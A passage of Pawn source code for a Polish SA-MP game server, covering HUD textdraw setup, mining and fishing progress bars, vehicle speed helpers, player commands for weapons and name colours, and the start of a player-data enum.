	TextDrawBackgroundColor(Textdraw[16], 255);
	TextDrawBoxColor(Textdraw[16], 50);
	TextDrawUseBox(Textdraw[16], 0);
	TextDrawSetProportional(Textdraw[16], 1);
	TextDrawSetSelectable(Textdraw[16], 0);

	Textdraw[17] = TextDrawCreate(565.000000, 437.000000, ">");
	TextDrawFont(Textdraw[17], 1);
	TextDrawLetterSize(Textdraw[17], 0.141662, 1.049998);
	TextDrawTextSize(Textdraw[17], 400.000000, 17.000000);
	TextDrawSetOutline(Textdraw[17], 1);
	TextDrawSetShadow(Textdraw[17], 0);
	TextDrawAlignment(Textdraw[17], 1);
	TextDrawColor(Textdraw[17], 1097458175);
	TextDrawBackgroundColor(Textdraw[17], 255);
	TextDrawBoxColor(Textdraw[17], 50);
	TextDrawUseBox(Textdraw[17], 0);
	TextDrawSetProportional(Textdraw[17], 1);
	TextDrawSetSelectable(Textdraw[17], 0);

	Textdraw[18] = TextDrawCreate(617.000000, 423.000000, "HUD:radar_locosyndicate");
	TextDrawFont(Textdraw[18], 4);
	TextDrawLetterSize(Textdraw[18], 0.600000, 2.000000);
	TextDrawTextSize(Textdraw[18], 8.000000, 8.500000);
	TextDrawSetOutline(Textdraw[18], 1);
	TextDrawSetShadow(Textdraw[18], 0);
	TextDrawAlignment(Textdraw[18], 1);
	TextDrawColor(Textdraw[18], 1687547391);
	TextDrawBackgroundColor(Textdraw[18], 255);
	TextDrawBoxColor(Textdraw[18], 50);
	TextDrawUseBox(Textdraw[18], 1);
	TextDrawSetProportional(Textdraw[18], 1);
	TextDrawSetSelectable(Textdraw[18], 0);

	Textdraw[19] = TextDrawCreate(600.000000, 358.000000, "_");
	TextDrawFont(Textdraw[19], 1);
	TextDrawLetterSize(Textdraw[19], 0.154164, 0.800000);
	TextDrawTextSize(Textdraw[19], 1114.500000, 339.000000);
	TextDrawSetOutline(Textdraw[19], 1);
	TextDrawSetShadow(Textdraw[19], 0);
	TextDrawAlignment(Textdraw[19], 2);
	TextDrawColor(Textdraw[19], -1962934017);
	TextDrawBackgroundColor(Textdraw[19], 255);
	TextDrawBoxColor(Textdraw[19], 50);
	TextDrawUseBox(Textdraw[19], 0);
	TextDrawSetProportional(Textdraw[19], 1);
	TextDrawSetSelectable(Textdraw[19], 0);

	Textdraw[20] = TextDrawCreate(460.000000, 327.000000, "Automatyczna zabawa");
	TextDrawFont(Textdraw[20], 1);
	TextDrawLetterSize(Textdraw[20], 0.208333, 1.099997);
	TextDrawTextSize(Textdraw[20], 112.500000, 278.000000);
	TextDrawSetOutline(Textdraw[20], 1);
	TextDrawSetShadow(Textdraw[20], 0);
	TextDrawAlignment(Textdraw[20], 2);
	TextDrawColor(Textdraw[20], 9145343);
	TextDrawBackgroundColor(Textdraw[20], 255);
	TextDrawBoxColor(Textdraw[20], 50);
	TextDrawUseBox(Textdraw[20], 0);
	TextDrawSetProportional(Textdraw[20], 1);
	TextDrawSetSelectable(Textdraw[20], 0);

	Textdraw[21] = TextDrawCreate(460.000000, 338.000000, "_");
	TextDrawFont(Textdraw[21], 1);
	TextDrawLetterSize(Textdraw[21], 0.366665, 1.500000);
	TextDrawTextSize(Textdraw[21], 772.000000, 262.000000);
	TextDrawSetOutline(Textdraw[21], 1);
	TextDrawSetShadow(Textdraw[21], 0);
	TextDrawAlignment(Textdraw[21], 2);
	TextDrawColor(Textdraw[21], 9145343);
	TextDrawBackgroundColor(Textdraw[21], 255);
	TextDrawBoxColor(Textdraw[21], 50);
	TextDrawUseBox(Textdraw[21], 0);
	TextDrawSetProportional(Textdraw[21], 1);
	TextDrawSetSelectable(Textdraw[21], 0);

	Textdraw[22] = TextDrawCreate(408.000000, 328.000000, "HUD:radar_race");
	TextDrawFont(Textdraw[22], 4);
	TextDrawLetterSize(Textdraw[22], 0.600000, 2.000000);
	TextDrawTextSize(Textdraw[22], 9.000000, 8.500000);
	TextDrawSetOutline(Textdraw[22], 1);
	TextDrawSetShadow(Textdraw[22], 0);
	TextDrawAlignment(Textdraw[22], 1);
	TextDrawColor(Textdraw[22], 16777215);
	TextDrawBackgroundColor(Textdraw[22], 255);
	TextDrawBoxColor(Textdraw[22], 9145138);
	TextDrawUseBox(Textdraw[22], 1);
	TextDrawSetProportional(Textdraw[22], 1);
	TextDrawSetSelectable(Textdraw[22], 0);

	Textdraw[23] = TextDrawCreate(409.000000, 372.000000, "HUD:radar_race");
	TextDrawFont(Textdraw[23], 4);
	TextDrawLetterSize(Textdraw[23], 0.600000, 2.000000);
	TextDrawTextSize(Textdraw[23], 9.000000, 8.500000);
	TextDrawSetOutline(Textdraw[23], 1);
	TextDrawSetShadow(Textdraw[23], 0);
	TextDrawAlignment(Textdraw[23], 1);
	TextDrawColor(Textdraw[23], -65281);
	TextDrawBackgroundColor(Textdraw[23], 255);
	TextDrawBoxColor(Textdraw[23], 9145138);
	TextDrawUseBox(Textdraw[23], 1);
	TextDrawSetProportional(Textdraw[23], 1);
	TextDrawSetSelectable(Textdraw[23], 0);

	Textdraw[24] = TextDrawCreate(460.000000, 371.000000, "Event administratora");
	TextDrawFont(Textdraw[24], 1);
	TextDrawLetterSize(Textdraw[24], 0.208333, 1.099997);
	TextDrawTextSize(Textdraw[24], 112.500000, 278.000000);
	TextDrawSetOutline(Textdraw[24], 1);
	TextDrawSetShadow(Textdraw[24], 0);
	TextDrawAlignment(Textdraw[24], 2);
	TextDrawColor(Textdraw[24], -764862721);
	TextDrawBackgroundColor(Textdraw[24], 255);
	TextDrawBoxColor(Textdraw[24], 50);
	TextDrawUseBox(Textdraw[24], 0);
	TextDrawSetProportional(Textdraw[24], 1);
	TextDrawSetSelectable(Textdraw[24], 0);

	Textdraw[25] = TextDrawCreate(456.000000, 382.000000, "Lot na skrzydle~n~~w~~h~Organizator: ~y~[IDM]critical~n~~w~~h~Zapisanych: ~y~3");
	TextDrawFont(Textdraw[25], 1);
	TextDrawLetterSize(Textdraw[25], 0.287499, 1.299998);
	TextDrawTextSize(Textdraw[25], 772.000000, 262.000000);
	TextDrawSetOutline(Textdraw[25], 1);
	TextDrawSetShadow(Textdraw[25], 0);
	TextDrawAlignment(Textdraw[25], 2);
	TextDrawColor(Textdraw[25], -764862721);
	TextDrawBackgroundColor(Textdraw[25], 255);
	TextDrawBoxColor(Textdraw[25], 50);
	TextDrawUseBox(Textdraw[25], 0);
	TextDrawSetProportional(Textdraw[25], 1);
	TextDrawSetSelectable(Textdraw[25], 0);

	Textdraw[26] = TextDrawCreate(287.000000, 385.000000, "ld_grav:thorn");
	TextDrawFont(Textdraw[26], 4);
	TextDrawLetterSize(Textdraw[26], 0.600000, 2.000000);
	TextDrawTextSize(Textdraw[26], 56.500000, 33.500000);
	TextDrawSetOutline(Textdraw[26], 1);
	TextDrawSetShadow(Textdraw[26], 0);
	TextDrawAlignment(Textdraw[26], 1);
	TextDrawColor(Textdraw[26], 852308735);
	TextDrawBackgroundColor(Textdraw[26], 255);
	TextDrawBoxColor(Textdraw[26], 50);
	TextDrawUseBox(Textdraw[26], 1);
	TextDrawSetProportional(Textdraw[26], 1);
	TextDrawSetSelectable(Textdraw[26], 0);

	Textdraw[27] = TextDrawCreate(182.000000, 411.000000, "_");
	TextDrawFont(Textdraw[27], 1);
	TextDrawLetterSize(Textdraw[27], 0.187500, 0.899999);
	TextDrawTextSize(Textdraw[27], 585.000000, 257.000000);
	TextDrawSetOutline(Textdraw[27], 1);
	TextDrawSetShadow(Textdraw[27], 0);
	TextDrawAlignment(Textdraw[27], 2);
	TextDrawColor(Textdraw[27], 16711935);
	TextDrawBackgroundColor(Textdraw[27], 255);
	TextDrawBoxColor(Textdraw[27], 50);
	TextDrawUseBox(Textdraw[27], 0);
	TextDrawSetProportional(Textdraw[27], 1);
	TextDrawSetSelectable(Textdraw[27], 0);
}

forward UpdateGornictwo(playerid);
public UpdateGornictwo(playerid) {
	HideProgressBarForPlayer(playerid, GornictwoBar[playerid]);
	SetProgressBarValue(GornictwoBar[playerid], GProgress[playerid]);
	if(GProgress[playerid] > 75) SetProgressBarColor(GornictwoBar[playerid], 0x35FF35FF);
	if(GProgress[playerid] > 20 && GProgress[playerid] < 76) SetProgressBarColor(GornictwoBar[playerid], 0xFFFF00FF);
	if(GProgress[playerid] > -1 && GProgress[playerid] < 21) SetProgressBarColor(GornictwoBar[playerid], 0xFF2828FF);
	ShowProgressBarForPlayer(playerid, GornictwoBar[playerid]);
}

forward CreatePlayerTD(playerid);
public CreatePlayerTD(playerid)
{
	FishingBar[playerid] = CreateProgressBar(420.00, 247.00, 61.50, 7.19, 16045823, 100.0);
	Fishing0P[playerid] = CreatePlayerTextDraw(playerid, 439.500000, 138.755554, "~w~~h~ABY ZLOWIC RYBE~n~NACISKAJ KLAWISZ ~y~Y");
	PlayerTextDrawLetterSize(playerid, Fishing0P[playerid], 0.282500, 1.407111);
	PlayerTextDrawAlignment(playerid, Fishing0P[playerid], 2);
	PlayerTextDrawColor(playerid, Fishing0P[playerid], -1);
	PlayerTextDrawSetShadow(playerid, Fishing0P[playerid], 0);
	PlayerTextDrawSetOutline(playerid, Fishing0P[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, Fishing0P[playerid], 51);
	PlayerTextDrawFont(playerid, Fishing0P[playerid], 1);
	PlayerTextDrawSetProportional(playerid, Fishing0P[playerid], 1);

    GornictwoBar[playerid] = CreateProgressBar(504.00, 68.00, 32.50, 3.19, -1, 100.0);

	JailTime[playerid] = CreatePlayerTextDraw(playerid, 321.666473, 343.051971, "_");
	PlayerTextDrawLetterSize(playerid, JailTime[playerid], 0.293000, 1.425778);
	PlayerTextDrawAlignment(playerid, JailTime[playerid], 2);
	PlayerTextDrawColor(playerid, JailTime[playerid], -1);
	PlayerTextDrawSetShadow(playerid, JailTime[playerid], 0);
	PlayerTextDrawSetOutline(playerid, JailTime[playerid], 1);
	PlayerTextDrawBackgroundColor(playerid, JailTime[playerid], 51);
	PlayerTextDrawFont(playerid, JailTime[playerid], 1);
	PlayerTextDrawSetProportional(playerid, JailTime[playerid], 1);

	Nick[playerid] = CreatePlayerTextDraw(playerid, 245.000000, 438.000000, "1 ~w~~h~[IDM]critical");
	PlayerTextDrawFont(playerid, Nick[playerid], 1);
	PlayerTextDrawLetterSize(playerid, Nick[playerid], 0.154164, 0.850000);
	PlayerTextDrawTextSize(playerid, Nick[playerid], 485.000000, 17.000000);
	PlayerTextDrawSetOutline(playerid, Nick[playerid], 1);
	PlayerTextDrawSetShadow(playerid, Nick[playerid], 0);
	PlayerTextDrawAlignment(playerid, Nick[playerid], 1);
	PlayerTextDrawColor(playerid, Nick[playerid], 1687547391);
	PlayerTextDrawBackgroundColor(playerid, Nick[playerid], 255);
	PlayerTextDrawBoxColor(playerid, Nick[playerid], 50);
	PlayerTextDrawUseBox(playerid, Nick[playerid], 0);
	PlayerTextDrawSetProportional(playerid, Nick[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, Nick[playerid], 0);
	PlayerTextDrawSetPreviewVehCol(playerid, Nick[playerid], 1, 1);

	ExpTD[playerid] = CreatePlayerTextDraw(playerid, 322.000000, 438.000000, "EXP: ~w~~h~237010");
	PlayerTextDrawFont(playerid, ExpTD[playerid], 1);
	PlayerTextDrawLetterSize(playerid, ExpTD[playerid], 0.154164, 0.850000);
	PlayerTextDrawTextSize(playerid, ExpTD[playerid], 438.500000, 17.000000);
	PlayerTextDrawSetOutline(playerid, ExpTD[playerid], 1);
	PlayerTextDrawSetShadow(playerid, ExpTD[playerid], 0);
	PlayerTextDrawAlignment(playerid, ExpTD[playerid], 1);
	PlayerTextDrawColor(playerid, ExpTD[playerid], 1687547391);
	PlayerTextDrawBackgroundColor(playerid, ExpTD[playerid], 255);
	PlayerTextDrawBoxColor(playerid, ExpTD[playerid], 50);
	PlayerTextDrawUseBox(playerid, ExpTD[playerid], 0);
	PlayerTextDrawSetProportional(playerid, ExpTD[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, ExpTD[playerid], 0);
	PlayerTextDrawSetPreviewVehCol(playerid, ExpTD[playerid], 1, 1);

	Grasz[playerid] = CreatePlayerTextDraw(playerid, 377.000000, 438.000000, "Grasz: ~w~~h~0~b~~h~h ~w~~h~38~b~~h~m");
	PlayerTextDrawFont(playerid, Grasz[playerid], 1);
	PlayerTextDrawLetterSize(playerid, Grasz[playerid], 0.154164, 0.850000);
	PlayerTextDrawTextSize(playerid, Grasz[playerid], 437.000000, 17.000000);
	PlayerTextDrawSetOutline(playerid, Grasz[playerid], 1);
	PlayerTextDrawSetShadow(playerid, Grasz[playerid], 0);
	PlayerTextDrawAlignment(playerid, Grasz[playerid], 1);
	PlayerTextDrawColor(playerid, Grasz[playerid], 1687547391);
	PlayerTextDrawBackgroundColor(playerid, Grasz[playerid], 255);
	PlayerTextDrawBoxColor(playerid, Grasz[playerid], 50);
	PlayerTextDrawUseBox(playerid, Grasz[playerid], 0);
	PlayerTextDrawSetProportional(playerid, Grasz[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, Grasz[playerid], 0);
	PlayerTextDrawSetPreviewVehCol(playerid, Grasz[playerid], 1, 1);

	FPSTD[playerid] = CreatePlayerTextDraw(playerid, 435.000000, 438.000000, "FPS: ~w~~h~82");
	PlayerTextDrawFont(playerid, FPSTD[playerid], 1);
	PlayerTextDrawLetterSize(playerid, FPSTD[playerid], 0.154164, 0.850000);
	PlayerTextDrawTextSize(playerid, FPSTD[playerid], 480.500000, 17.000000);
	PlayerTextDrawSetOutline(playerid, FPSTD[playerid], 1);
	PlayerTextDrawSetShadow(playerid, FPSTD[playerid], 0);
	PlayerTextDrawAlignment(playerid, FPSTD[playerid], 1);
	PlayerTextDrawColor(playerid, FPSTD[playerid], 1687547391);
	PlayerTextDrawBackgroundColor(playerid, FPSTD[playerid], 255);
	PlayerTextDrawBoxColor(playerid, FPSTD[playerid], 50);
	PlayerTextDrawUseBox(playerid, FPSTD[playerid], 0);
	PlayerTextDrawSetProportional(playerid, FPSTD[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, FPSTD[playerid], 0);
	PlayerTextDrawSetPreviewVehCol(playerid, FPSTD[playerid], 1, 1);

	PingTD[playerid] = CreatePlayerTextDraw(playerid, 476.000000, 438.000000, "Ping: ~w~~h~29");
	PlayerTextDrawFont(playerid, PingTD[playerid], 1);
	PlayerTextDrawLetterSize(playerid, PingTD[playerid], 0.154164, 0.850000);
	PlayerTextDrawTextSize(playerid, PingTD[playerid], 569.500000, 17.000000);
	PlayerTextDrawSetOutline(playerid, PingTD[playerid], 1);
	PlayerTextDrawSetShadow(playerid, PingTD[playerid], 0);
	PlayerTextDrawAlignment(playerid, PingTD[playerid], 1);
	PlayerTextDrawColor(playerid, PingTD[playerid], 1687547391);
	PlayerTextDrawBackgroundColor(playerid, PingTD[playerid], 255);
	PlayerTextDrawBoxColor(playerid, PingTD[playerid], 50);
	PlayerTextDrawUseBox(playerid, PingTD[playerid], 0);
	PlayerTextDrawSetProportional(playerid, PingTD[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, PingTD[playerid], 0);
	PlayerTextDrawSetPreviewVehCol(playerid, PingTD[playerid], 1, 1);

	LevelTD[playerid] = CreatePlayerTextDraw(playerid, 522.000000, 438.000000, "Level: ~w~~h~1001");
	PlayerTextDrawFont(playerid, LevelTD[playerid], 1);
	PlayerTextDrawLetterSize(playerid, LevelTD[playerid], 0.154164, 0.850000);
	PlayerTextDrawTextSize(playerid, LevelTD[playerid], 646.000000, 17.000000);
	PlayerTextDrawSetOutline(playerid, LevelTD[playerid], 1);
	PlayerTextDrawSetShadow(playerid, LevelTD[playerid], 0);
	PlayerTextDrawAlignment(playerid, LevelTD[playerid], 1);
	PlayerTextDrawColor(playerid, LevelTD[playerid], 1687547391);
	PlayerTextDrawBackgroundColor(playerid, LevelTD[playerid], 255);
	PlayerTextDrawBoxColor(playerid, LevelTD[playerid], 50);
	PlayerTextDrawUseBox(playerid, LevelTD[playerid], 0);
	PlayerTextDrawSetProportional(playerid, LevelTD[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, LevelTD[playerid], 0);
	PlayerTextDrawSetPreviewVehCol(playerid, LevelTD[playerid], 1, 1);

	ExpPlus[playerid] = CreatePlayerTextDraw(playerid, 338.000000, 431.000000, "_");
	PlayerTextDrawFont(playerid, ExpPlus[playerid], 1);
	PlayerTextDrawLetterSize(playerid, ExpPlus[playerid], 0.154164, 0.850000);
	PlayerTextDrawTextSize(playerid, ExpPlus[playerid], 400.000000, 17.000000);
	PlayerTextDrawSetOutline(playerid, ExpPlus[playerid], 1);
	PlayerTextDrawSetShadow(playerid, ExpPlus[playerid], 0);
	PlayerTextDrawAlignment(playerid, ExpPlus[playerid], 2);
	PlayerTextDrawColor(playerid, ExpPlus[playerid], 1687547391);
	PlayerTextDrawBackgroundColor(playerid, ExpPlus[playerid], 255);
	PlayerTextDrawBoxColor(playerid, ExpPlus[playerid], 50);
	PlayerTextDrawUseBox(playerid, ExpPlus[playerid], 0);
	PlayerTextDrawSetProportional(playerid, ExpPlus[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, ExpPlus[playerid], 0);
	PlayerTextDrawSetPreviewVehCol(playerid, ExpPlus[playerid], 1, 1);

	PortfelTD[playerid] = CreatePlayerTextDraw(playerid, 577.000000, 438.000000, "Portfel: ~w~~h~5 zl");
	PlayerTextDrawFont(playerid, PortfelTD[playerid], 1);
	PlayerTextDrawLetterSize(playerid, PortfelTD[playerid], 0.154164, 0.850000);
	PlayerTextDrawTextSize(playerid, PortfelTD[playerid], 646.000000, 17.000000);
	PlayerTextDrawSetOutline(playerid, PortfelTD[playerid], 1);
	PlayerTextDrawSetShadow(playerid, PortfelTD[playerid], 0);
	PlayerTextDrawAlignment(playerid, PortfelTD[playerid], 1);
	PlayerTextDrawColor(playerid, PortfelTD[playerid], 1687547391);
	PlayerTextDrawBackgroundColor(playerid, PortfelTD[playerid], 255);
	PlayerTextDrawBoxColor(playerid, PortfelTD[playerid], 50);
	PlayerTextDrawUseBox(playerid, PortfelTD[playerid], 0);
	PlayerTextDrawSetProportional(playerid, PortfelTD[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, PortfelTD[playerid], 0);
	PlayerTextDrawSetPreviewVehCol(playerid, PortfelTD[playerid], 1, 1);

	Kamizelka[playerid] = CreatePlayerTextDraw(playerid, 578.000000, 44.000000, "100%");
	PlayerTextDrawFont(playerid, Kamizelka[playerid], 2);
	PlayerTextDrawLetterSize(playerid, Kamizelka[playerid], 0.241666, 0.899999);
	PlayerTextDrawTextSize(playerid, Kamizelka[playerid], 400.000000, 17.000000);
	PlayerTextDrawSetOutline(playerid, Kamizelka[playerid], 1);
	PlayerTextDrawSetShadow(playerid, Kamizelka[playerid], 0);
	PlayerTextDrawAlignment(playerid, Kamizelka[playerid], 2);
	PlayerTextDrawColor(playerid, Kamizelka[playerid], -1);
	PlayerTextDrawBackgroundColor(playerid, Kamizelka[playerid], 255);
	PlayerTextDrawBoxColor(playerid, Kamizelka[playerid], 50);
	PlayerTextDrawUseBox(playerid, Kamizelka[playerid], 0);
	PlayerTextDrawSetProportional(playerid, Kamizelka[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, Kamizelka[playerid], 0);

	HPTD[playerid] = CreatePlayerTextDraw(playerid, 578.000000, 66.000000, "100%");
	PlayerTextDrawFont(playerid, HPTD[playerid], 2);
	PlayerTextDrawLetterSize(playerid, HPTD[playerid], 0.241666, 0.899999);
	PlayerTextDrawTextSize(playerid, HPTD[playerid], 400.000000, 17.000000);
	PlayerTextDrawSetOutline(playerid, HPTD[playerid], 1);
	PlayerTextDrawSetShadow(playerid, HPTD[playerid], 0);
	PlayerTextDrawAlignment(playerid, HPTD[playerid], 2);
	PlayerTextDrawColor(playerid, HPTD[playerid], -1962934017);
	PlayerTextDrawBackgroundColor(playerid, HPTD[playerid], 255);
	PlayerTextDrawBoxColor(playerid, HPTD[playerid], 50);
	PlayerTextDrawUseBox(playerid, HPTD[playerid], 0);
	PlayerTextDrawSetProportional(playerid, HPTD[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, HPTD[playerid], 0);
	PlayerTextDrawSetPreviewVehCol(playerid, HPTD[playerid], 1, 1);

	KillInfo[playerid] = CreatePlayerTextDraw(playerid, 314.000000, 394.000000, "_");
	PlayerTextDrawFont(playerid, KillInfo[playerid], 1);
	PlayerTextDrawLetterSize(playerid, KillInfo[playerid], 0.187500, 0.899999);
	PlayerTextDrawTextSize(playerid, KillInfo[playerid], 474.000000, 318.500000);
	PlayerTextDrawSetOutline(playerid, KillInfo[playerid], 1);
	PlayerTextDrawSetShadow(playerid, KillInfo[playerid], 0);
	PlayerTextDrawAlignment(playerid, KillInfo[playerid], 2);
	PlayerTextDrawColor(playerid, KillInfo[playerid], -1);
	PlayerTextDrawBackgroundColor(playerid, KillInfo[playerid], 255);
	PlayerTextDrawBoxColor(playerid, KillInfo[playerid], 50);
	PlayerTextDrawUseBox(playerid, KillInfo[playerid], 0);
	PlayerTextDrawSetProportional(playerid, KillInfo[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, KillInfo[playerid], 0);
	PlayerTextDrawSetPreviewVehCol(playerid, KillInfo[playerid], 1, 1);

	Licznik[playerid] = CreatePlayerTextDraw(playerid, 561.000000, 408.000000, "Infernus~n~~w~~h~54 ~b~~h~km/h ~w~~h~| ~b~~h~HP: ~w~~h~100");
	PlayerTextDrawFont(playerid, Licznik[playerid], 2);
	PlayerTextDrawLetterSize(playerid, Licznik[playerid], 0.170830, 1.100000);
	PlayerTextDrawTextSize(playerid, Licznik[playerid], 729.000000, 252.000000);
	PlayerTextDrawSetOutline(playerid, Licznik[playerid], 1);
	PlayerTextDrawSetShadow(playerid, Licznik[playerid], 0);
	PlayerTextDrawAlignment(playerid, Licznik[playerid], 2);
	PlayerTextDrawColor(playerid, Licznik[playerid], 1097458175);
	PlayerTextDrawBackgroundColor(playerid, Licznik[playerid], 255);
	PlayerTextDrawBoxColor(playerid, Licznik[playerid], 100);
	PlayerTextDrawUseBox(playerid, Licznik[playerid], 0);
	PlayerTextDrawSetProportional(playerid, Licznik[playerid], 1);
	PlayerTextDrawSetSelectable(playerid, Licznik[playerid], 0);
	PlayerTextDrawSetPreviewVehCol(playerid, Licznik[playerid], 1, 1);
}

forward OdblokujSkok(p);
public OdblokujSkok(p)
{
	Opcja[p]=11;
	return 1;
}

Float:gSpeed(Float:vel_x, Float:vel_y, Float:vel_z) return floatsqroot(floatpower(vel_x, 2.0) + floatpower(vel_y, 2.0) + floatpower(vel_z, 2.0)) * 215.0;
Float:GetVehSpeed(vehicleid)
{
	new Float:v[3];
    GetVehicleVelocity(vehicleid, v[0], v[1], v[2]);

    return gSpeed(v[0], v[1], v[2]);
}
Float:GetPlayerSpeed(playerid)
{
	if(IsPlayerInAnyVehicle(playerid)) return GetVehSpeed(GetPlayerVehicleID(playerid));

	new Float:v[3];
	GetPlayerVelocity(playerid, v[0], v[1], v[2]);
    return floatsqroot(floatpower(v[0], 2.0) + floatpower(v[1], 2.0) + floatpower(v[2], 2.0)) * 180.0;
}

CMD:disarm(playerid, params[]) return cmd_rozbroj(playerid, params);
CMD:rozbroj(playerid, params[]) {
	ResetPlayerWeapons(playerid);
	return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Rozbroi³eœ/aœ siê."); }

CMD:obiekty(playerid, params[])
{
	Streamer_DestroyAllVisibleItems(playerid, 0);
	if(!GetPVarInt(playerid, "player_objected"))
	{
		SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Obiekty na mapie ukryte.");
		Streamer_ToggleIdleUpdate(playerid, 0);
		Streamer_ToggleItemUpdate(playerid, 0, 0);
		return SetPVarInt(playerid, "player_objected", 1);
	}
	else
	{
		SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Obiekty na mapie w³¹czone.");
		Streamer_ToggleIdleUpdate(playerid, 1);
		Streamer_ToggleItemUpdate(playerid, 0, 1);
		return SetPVarInt(playerid, "player_objected", 0);
	}
}

CMD:spadochron(playerid, params[]) return cmd_parachute(playerid, params);
CMD:parachute(playerid, params[]) return GivePlayerWeapon(playerid, 46, 1);

CMD:aparat(playerid, params[]) return cmd_camera(playerid, params);
CMD:camera(playerid, params[]) return GivePlayerWeapon(playerid, 43, 9999);

CMD:gunsid(playerid, params[]) {
	new gunsid1[1024];
	format(gunsid1, sizeof(gunsid1), ""C_LOLIVE"0 - piêœæ, 1 - kastet, 2 - kij golfowy, 3 - pa³ka policyjna, 4 - nó¿, 5 - kij baseballowy, 6 - ³opata, 7 - kij bilardowy, 8 - katana,");
	SendClientMessage(playerid, -1, gunsid1);
	new gunsid2[1024];
	format(gunsid2, sizeof(gunsid2), ""C_LOLIVE"9 - pi³a, 10-11 - dildo, 12-13 - wibrator, 14 - kwiaty, 15 - laska, 16 - granat, 17 - gaz, 18 - molotov, 22 - 9mm, 23 - silenced 9mm,");
	SendClientMessage(playerid, -1, gunsid2);
	new gunsid3[1024];
	format(gunsid3, sizeof(gunsid3), ""C_LOLIVE"24 - desert eagle, 25 - shotgun, 26 - sawnoff, 27 - combat, 28 - uzi, 29 - mp5, 30 - ak-47, 31 - m4, 32 - tec-9, 33 - country rifle,");
	SendClientMessage(playerid, -1, gunsid3);
	new gunsid4[1024];
	format(gunsid4, sizeof(gunsid3), ""C_LOLIVE"34 - sniper rifle, 35 - rpg, 36 - hs rocket, 37 - flamethrower, 38 - minigun, 39 - ³adunki wybuchowe, 40 - detonator, 41 - spray,");
	SendClientMessage(playerid, -1, gunsid4);
	new gunsid5[1024];
	format(gunsid5, sizeof(gunsid5), ""C_LOLIVE"42 - gaœnica, 43 - camera, 44-45 - goggles, 46 - spadochron");
	return SendClientMessage(playerid, -1, gunsid5);
}

CMD:szary(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, GREY); }
CMD:ziel1(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, GREEN); }
CMD:ziel2(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid,	LIME); }
CMD:ziel3(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, LAWNGREEN); }
CMD:ziel4(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, SEAGREEN); }
CMD:ziel5(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, SPRINGGREEN); }
CMD:czerw(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, RED); }
CMD:zolty(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, YELLOW); }
CMD:nieb1(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, BLUE); }
CMD:nieb2(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, LIGHTBLUE); }
CMD:nieb3(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, AQUA); }
CMD:nieb4(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, FLBLUE); }
CMD:pomar1(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, ORANGE); }
CMD:pomar2(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, ORANGERED); }
CMD:magenta1(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, MAGENTA); }
CMD:magenta2(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, PINK); }
CMD:magenta3(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, MEDIUMMAGENTA); }
CMD:navy(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, NAVY); }
CMD:crimson(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, CRIMSON); }
CMD:bisque(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, BISQUE); }
CMD:coral(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, CORAL); }
CMD:zloty(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, GOLD); }
CMD:indigo(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, INDIGO); }
CMD:ivory(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, IVORY); }
CMD:maroon(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, MAROON); }
CMD:oliwny(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, OLIVE); }
CMD:tomato(playerid, params[]) {
	ConstColor[playerid] = true;
	return SetPlayerColor(playerid, TOMATO); }



// player data
enum E_PLAYERS
{
	ID,
	Name[MAX_PLAYER_NAME],
	Password[65],
	Kills,
	Deaths,
	Cash,
	Float: X_Pos,
	Float: Y_Pos,
	Float: Z_Pos,
	Float: A_Pos,
	Interior,
	Admin,
	Vip,
	MuteTime,
	Warny,
	Skin,
	Exp,
	Level,
	vCash,
	Hours,
	Minutes,
	Gang,
	House,
	bool: IsLoggedIn,
	bool: HasRealTime,
	bool: HasSounds,
	bool: HasUnlockedTP,
	bool: HasUnlockedSolo,
	NickChange,
	LoginAttempts,
	ItemAmount1,
	ItemName1[256],
	ItemAmount2,
	ItemName2[256],
	ItemAmount3,
	ItemName3[256],
	ItemAmount4,
	ItemName4[256],
	ItemAmount5,
	ItemName5[256],
	ItemAmount6,
	ItemName6[256],
	ItemAmount7,
	ItemName7[256],
	ItemAmount8,
	ItemName8[256],
	Hitman,
	r1,
	r2,
	r3,
	r4,
